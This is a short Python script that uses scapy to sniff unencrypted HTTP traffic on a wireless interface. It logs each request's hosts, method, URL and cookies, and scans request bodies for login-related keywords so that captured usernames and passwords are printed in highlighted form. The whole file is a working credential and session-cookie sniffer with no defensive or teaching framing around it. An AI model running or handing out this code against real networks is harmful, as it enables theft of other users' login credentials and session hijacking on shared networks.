#!/usr/bin/evn python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)

def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        method = packet[http.HTTPRequest].Method
        coockie = packet[http.HTTPRequest].Cookie
        ips = f"{packet[scapy.IP].src} ----> {packet[scapy.IP].dst}"
        print(f"\x1b[6;30;42m {ips} :: {method} \x1b[0m :--: \033[93m {url} ")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ['username','User','UserName','Login', 'login','user']
            for key in keywords:                
                if key in str(load):
                    print(f"\n\n \x1b[3;37;41m \033[1m[+] {ips} :==: {method} {url}  {load} \x1b[0m \n\n")
                    break
        


interface = "wlan0"

sniff(interface)

print(" This color text \x1b[0m \n \n")



